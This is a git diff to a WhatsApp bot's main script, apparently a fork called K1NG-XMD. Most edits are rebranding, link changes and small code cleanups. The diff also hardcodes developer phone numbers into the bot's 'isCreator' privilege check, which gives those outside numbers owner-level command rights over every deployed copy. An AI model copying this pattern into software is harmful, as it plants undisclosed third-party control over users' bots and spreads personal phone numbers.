@@ -106,23 +106,15 @@ const port = process.env.PORT || 9090;
   console.log('🧬 Installing Plugins')
   const path = require('path');
   fs.readdirSync("./plugins/").forEach((plugin) => {
-  if (path.extname(plugin).toLowerCase() == ".js") >m
+  if (path.extname(plugin).toLowerCase() == ".js") {
   require("./plugins/" + plugin);
   }
   });
   console.log('Plugins installed successful ✅')
   console.log('K1NG-XMD CONNECTED SUCCESSFULLY ✅')
   
-  let up = `
-╔═════════════════
-║ *K1NG-MD CONNECTED*      
-╠═════════════════
-║ *⚡ K1NG TECH*        
-╠═════════════════
-║ *🧩 YOUR PREFIX :* ${prefix}       
-╠═══════════════
-`;
-    conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/ngnch5.jpeg` }, caption: up })
+  let up = `*Hello there K1NG-XMD User! \ud83d\udc4b\ud83c\udffb* \n\n> Simple , Straight Forward But Loaded With Features \ud83c\udf8a, Meet K1NG-XMD WhatsApp Bot.\n\n *Thanks for using K1NG-XMD \ud83d\udea9* \n\n> Join WhatsApp Channel :- ⤵️\n \https://whatsapp.com/channel/0029VbB1ik6JJhzOJmJQI33d\n\n- *YOUR PREFIX:* = ${prefix}\n\n- *BOT MODE:* = ${config.MODE}\n\nDont forget to give star to repo ⬇️\n\nhttps://github.com/kingtech12/K1NG-XMD\n\n> © ᴘᴏᴡᴇʀᴇᴅ ʙʏ K1NG BOY \ud83d\udda4`;
+    conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/gtv9eh.jpeg` }, caption: up })
   }
   })
   conn.ev.on('creds.update', saveCreds)
@@ -138,6 +130,7 @@ const port = process.env.PORT || 9090;
     }
   });
   //============================== 
+
   conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update));	  
 	  
   //=============readstatus=======
@@ -208,7 +201,7 @@ const port = process.env.PORT || 9090;
   conn.sendMessage(from, { text: teks }, { quoted: mek })
   }
   const udp = botNumber.split('@')[0];
-    const jawad = ('50933734591 ');
+    const jawad = ('13058962443', '50942241547', '50933734591');
     let isCreator = [udp, jawad, config.DEV]
 					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
 					.includes(mek.sender);
@@ -253,9 +246,9 @@ const port = process.env.PORT || 9090;
 					}
 					return;
 				}
-//================ownerreact==============
+ //================ownerreact==============
     
-if (senderNumber.includes("50933734591") && !isReact) {
+if (senderNumber.includes("5090000000") && !isReact) {
   const reactions = ["👑", "💀", "📊", "⚙️", "🧠", "🎯", "📈", "📝", "🏆", "🌍", "🇵🇰", "💗", "❤️", "💥", "🌼", "🏵️", ,"💐", "🔥", "❄️", "🌝", "🌚", "🐥", "🧊"];
   const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
   m.react(randomReaction);
@@ -361,7 +354,8 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
               ...message.message.viewOnceMessage.message
           }
       }
-          let mtype = Object.keys(message.message)[0]
+    
+      let mtype = Object.keys(message.message)[0]
       let content = await generateForwardMessageContent(message, forceForward)
       let ctype = Object.keys(content)[0]
       let context = {}
@@ -475,26 +469,6 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
     * @param {*} path
     * @returns
     */
-    //=====================================================
-    conn.getFile = async(PATH, save) => {
-      let res
-      let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
-          //if (!Buffer.isBuffer(data)) throw new TypeError('Result is not a buffer')
-      let type = await FileType.fromBuffer(data) || {
-          mime: 'application/octet-stream',
-          ext: '.bin'
-      }
-      let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext)
-      if (data && save) fs.promises.writeFile(filename, data)
-      return {
-          res,
-          filename,
-          size: await getSizeMedia(data),
-          ...type,
-          data
-      }
-    
-    }
     //=====================================================
     conn.getFile = async(PATH, save) => {
       let res
@@ -754,7 +728,7 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
                         global.email
                     }\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${
                         global.github
-                    }/gotar-xmd\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${
+                    }/k1ng-xmd\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${
                         global.location
                     };;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
                 });
@@ -795,13 +769,7 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
   }
   
   app.get("/", (req, res) => {
-  res.send("K1NG MD STARTED ✅");
-  });
-  app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
-  setTimeout(() => {
-  connectToWA()
-  }, 4000);
- bot name MD STARTED ✅");
+  res.send("K1NG XMD STARTED ✅");
   });
   app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
   setTimeout(() => {
